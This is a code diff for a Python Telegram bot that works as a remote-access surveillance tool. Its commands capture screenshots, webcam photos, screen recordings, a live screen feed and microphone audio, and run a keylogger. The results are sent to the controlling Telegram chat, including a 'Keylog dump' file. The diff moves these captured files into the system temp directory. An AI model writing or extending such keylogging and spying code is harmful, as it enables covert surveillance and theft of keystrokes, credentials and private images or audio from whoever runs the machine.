@@ -53,13 +53,17 @@ def setup_logging():
 
 setup_logging()
 
+import tempfile
+import os
+TEMP_DIR = tempfile.gettempdir()
+
 import psutil
 import pyautogui
 import pynput
 import traceback
 
 def log_uncaught_exceptions(ex_cls, ex, tb):
-    with open("bot_fatal_crash.txt", "w") as f:
+    with open(os.path.join(TEMP_DIR, "bot_fatal_crash.txt"), "w") as f:
         f.write(''.join(traceback.format_tb(tb)))
         f.write('{0}: {1}'.format(ex_cls, ex))
 
@@ -155,7 +159,7 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def screenshot_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check_auth(update): return
     await update.message.reply_text("Taking screenshot... 📸")
-    screenshot_path = "screenshot.png"
+    screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
     pyautogui.screenshot(screenshot_path)
     with open(screenshot_path, "rb") as photo:
         await update.message.reply_photo(photo)
@@ -175,10 +179,10 @@ async def webcam_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cap.release()
     
     if ret:
-        cv2.imwrite("webcam.jpg", frame)
-        with open("webcam.jpg", "rb") as photo:
+        cv2.imwrite(os.path.join(TEMP_DIR, "webcam.jpg"), frame)
+        with open(os.path.join(TEMP_DIR, "webcam.jpg"), "rb") as photo:
             await update.message.reply_photo(photo)
-        os.remove("webcam.jpg")
+        os.remove(os.path.join(TEMP_DIR, "webcam.jpg"))
     else:
         await update.message.reply_text("❌ Failed to capture image.")
 
@@ -212,7 +216,7 @@ async def record_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
     await update.message.reply_text(f"🎥 Recording screen for {duration} seconds... Please wait.")
     
-    filename = "screen_record.mp4"
+    filename = os.path.join(TEMP_DIR, "screen_record.mp4")
     # Run the blocking recording in a separate thread so bot doesn't freeze
     thread = threading.Thread(target=record_worker, args=(duration, filename))
     thread.start()
@@ -233,7 +237,7 @@ async def livescreen_loop(update, context):
     global is_livestreaming
     while is_livestreaming:
         try:
-            screenshot_path = "live_screen.png"
+            screenshot_path = os.path.join(TEMP_DIR, "live_screen.png")
             pyautogui.screenshot(screenshot_path)
             with open(screenshot_path, "rb") as photo:
                 await update.message.reply_photo(photo)
@@ -646,10 +650,10 @@ async def intruder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ret, frame = cap.read()
         cap.release()
         if ret:
-            cv2.imwrite("intruder.jpg", frame)
-            with open("intruder.jpg", "rb") as f:
+            cv2.imwrite(os.path.join(TEMP_DIR, "intruder.jpg"), frame)
+            with open(os.path.join(TEMP_DIR, "intruder.jpg"), "rb") as f:
                 await update.message.reply_photo(f, caption="📸 Intruder Webcam Capture")
-            os.remove("intruder.jpg")
+            os.remove(os.path.join(TEMP_DIR, "intruder.jpg"))
             
     # 3. Capture Audio
     try:
@@ -657,10 +661,10 @@ async def intruder_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         duration = 10
         recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
         sd.wait()
-        sf.write("intruder.wav", recording, fs)
-        with open("intruder.wav", "rb") as f:
+        sf.write(os.path.join(TEMP_DIR, "intruder.wav"), recording, fs)
+        with open(os.path.join(TEMP_DIR, "intruder.wav"), "rb") as f:
             await update.message.reply_voice(f, caption="🎙️ Intruder Audio Capture")
-        os.remove("intruder.wav")
+        os.remove(os.path.join(TEMP_DIR, "intruder.wav"))
     except Exception as e:
         await update.message.reply_text(f"❌ Audio capture failed: {e}")
 
@@ -677,7 +681,7 @@ def keylogger_callback(event):
             keylog_buffer += f"[{event.name}]"
         
         if len(keylog_buffer) > 1000:
-            with open("keylog.txt", "a") as f:
+            with open(os.path.join(TEMP_DIR, "keylog.txt"), "a") as f:
                 f.write(keylog_buffer)
             keylog_buffer = ""
 
@@ -699,14 +703,14 @@ async def keylog_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         is_keylogging = False
         keyboard.unhook_all()
         if keylog_buffer:
-            with open("keylog.txt", "a") as f:
+            with open(os.path.join(TEMP_DIR, "keylog.txt"), "a") as f:
                 f.write(keylog_buffer)
             keylog_buffer = ""
         
-        if os.path.exists("keylog.txt"):
-            with open("keylog.txt", "rb") as f:
+        if os.path.exists(os.path.join(TEMP_DIR, "keylog.txt")):
+            with open(os.path.join(TEMP_DIR, "keylog.txt"), "rb") as f:
                 await update.message.reply_document(f, caption="📜 Keylog dump")
-            os.remove("keylog.txt")
+            os.remove(os.path.join(TEMP_DIR, "keylog.txt"))
         else:
             await update.message.reply_text("📜 Keylog stopped. No keys were pressed.")
 
